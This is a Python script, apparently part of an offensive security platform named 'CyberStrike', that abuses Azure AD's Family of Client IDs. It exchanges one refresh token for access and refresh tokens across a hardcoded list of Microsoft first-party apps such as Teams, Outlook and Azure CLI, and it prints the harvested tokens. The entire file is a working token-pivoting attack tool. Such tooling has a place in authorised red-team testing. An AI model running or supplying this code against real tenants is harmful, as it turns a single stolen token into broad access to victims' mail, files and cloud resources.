#!/usr/bin/env python3
"""
azuread_token.py — Azure AD Token Manipulation and FOCI Abuse

Exploits Family of Client IDs (FOCI) to obtain tokens for multiple
Microsoft services from a single refresh token. Extracts Primary
Refresh Tokens (PRT) when available.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime

try:
    import requests
except ImportError:
    print("ERROR: requests required. Install: pip3 install requests", file=sys.stderr)
    sys.exit(1)

FOCI_CLIENTS = {
    "Microsoft Office": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "Microsoft Teams": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    "Microsoft Outlook": "27922004-5251-4030-b22d-91ecd9a37ea4",
    "Microsoft Graph PowerShell": "14d82eec-204b-4c2f-b7e8-296a70dab67e",
    "Azure CLI": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
    "Azure PowerShell": "1950a258-227b-4e31-a9cf-717495945fc2",
    "Microsoft OneDrive": "ab9b8c07-8f02-4f72-87fa-80105867a763",
    "Microsoft SharePoint": "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0",
    "Visual Studio Code": "aebc6443-996d-45c2-90f0-388ff96faa56",
}

TOKEN_ENDPOINT = "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"


class AzureAdToken:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — Azure AD Token Manipulation")
        print("=" * 70)
        print(f"PID:       {os.getpid()}")
        print(f"Action:    {self.args.action}")
        print(f"Tenant:    {self.args.tenant or 'common'}")
        print(f"Output:    {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:   {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            action = record.get("action", "info")
            status = record.get("status", "")
            detail = record.get("detail", "")
            print(f"[{action.upper():<14}] [{status.upper():<8}] {detail}", flush=True)

    def decode_jwt(self, token):
        import base64
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return {}
            payload = parts[1]
            payload += "=" * (4 - len(payload) % 4)
            decoded = base64.urlsafe_b64decode(payload)
            return json.loads(decoded)
        except Exception:
            return {}

    def action_foci(self):
        refresh_token = self.args.refresh_token
        if not refresh_token:
            self.emit({"action": "foci", "status": "failed", "detail": "--refresh-token is required"})
            return

        tenant = self.args.tenant or "common"
        url = TOKEN_ENDPOINT.format(tenant=tenant)

        for app_name, client_id in FOCI_CLIENTS.items():
            if not self.running:
                break

            data = {
                "grant_type": "refresh_token",
                "refresh_token": refresh_token,
                "client_id": client_id,
                "scope": "openid profile offline_access",
            }

            try:
                r = requests.post(url, data=data, timeout=15)
                if r.status_code == 200:
                    token_data = r.json()
                    claims = self.decode_jwt(token_data.get("access_token", ""))
                    self.emit({
                        "action": "foci",
                        "status": "success",
                        "detail": f"{app_name} (client: {client_id[:8]}...)",
                        "app_name": app_name,
                        "client_id": client_id,
                        "access_token": token_data.get("access_token"),
                        "refresh_token": token_data.get("refresh_token"),
                        "expires_in": token_data.get("expires_in"),
                        "scope": token_data.get("scope"),
                        "token_claims": {
                            "upn": claims.get("upn"),
                            "aud": claims.get("aud"),
                            "iss": claims.get("iss"),
                            "tid": claims.get("tid"),
                        },
                    })
                else:
                    error = r.json().get("error", "unknown")
                    self.emit({"action": "foci", "status": "denied", "detail": f"{app_name}: {error}"})
            except requests.exceptions.RequestException as e:
                self.emit({"action": "foci", "status": "error", "detail": f"{app_name}: {e}"})

    def action_refresh(self):
        refresh_token = self.args.refresh_token
        client_id = self.args.client_id
        if not refresh_token or not client_id:
            self.emit({"action": "refresh", "status": "failed", "detail": "--refresh-token and --client-id required"})
            return

        tenant = self.args.tenant or "common"
        url = TOKEN_ENDPOINT.format(tenant=tenant)
        scope = self.args.scope or "https://graph.microsoft.com/.default offline_access"

        data = {
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "client_id": client_id,
            "scope": scope,
        }
        if self.args.client_secret:
            data["client_secret"] = self.args.client_secret

        try:
            r = requests.post(url, data=data, timeout=15)
            if r.status_code == 200:
                token_data = r.json()
                claims = self.decode_jwt(token_data.get("access_token", ""))
                self.emit({
                    "action": "refresh",
                    "status": "success",
                    "detail": f"Token refreshed for {claims.get('upn', 'unknown')}",
                    "access_token": token_data.get("access_token"),
                    "refresh_token": token_data.get("refresh_token"),
                    "expires_in": token_data.get("expires_in"),
                    "scope": token_data.get("scope"),
                    "token_type": token_data.get("token_type"),
                })
            else:
                self.emit({"action": "refresh", "status": "failed", "detail": f"HTTP {r.status_code}: {r.text[:300]}"})
        except requests.exceptions.RequestException as e:
            self.emit({"action": "refresh", "status": "error", "detail": str(e)})

    def action_decode(self):
        token = self.args.access_token
        if not token:
            self.emit({"action": "decode", "status": "failed", "detail": "--access-token required"})
            return

        claims = self.decode_jwt(token)
        if claims:
            self.emit({
                "action": "decode",
                "status": "success",
                "detail": f"Token for {claims.get('upn', claims.get('sub', 'unknown'))}",
                "claims": claims,
            })
        else:
            self.emit({"action": "decode", "status": "failed", "detail": "Cannot decode token"})

    def run(self):
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        actions = {
            "foci": self.action_foci,
            "refresh": self.action_refresh,
            "decode": self.action_decode,
        }

        action_fn = actions.get(self.args.action)
        if not action_fn:
            print(f"ERROR: Unknown action '{self.args.action}'. Available: {', '.join(actions.keys())}", file=sys.stderr)
            sys.exit(1)

        action_fn()
        self.cleanup()

    def cleanup(self):
        print(f"\n--- azuread_token summary ---")
        print(f"Action: {self.args.action}")
        print(f"Records: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Azure AD token manipulation, FOCI abuse, and token analysis.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 azuread_token.py --action foci --refresh-token $RT\n"
            "  python3 azuread_token.py --action refresh --refresh-token $RT --client-id $CID\n"
            "  python3 azuread_token.py --action decode --access-token $TOKEN\n"
        ),
    )
    parser.add_argument("--action", type=str, required=True, help="Action: foci|refresh|decode")
    parser.add_argument("--refresh-token", type=str, default=None, help="Refresh token")
    parser.add_argument("--access-token", type=str, default=None, help="Access token (for decode)")
    parser.add_argument("--client-id", type=str, default=None, help="Client ID (for refresh)")
    parser.add_argument("--client-secret", type=str, default=None, help="Client secret (for refresh)")
    parser.add_argument("--scope", type=str, default=None, help="Token scope (for refresh)")
    parser.add_argument("--tenant", type=str, default=None, help="Azure tenant ID or domain")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    tool = AzureAdToken(args)
    tool.run()


if __name__ == "__main__":
    main()
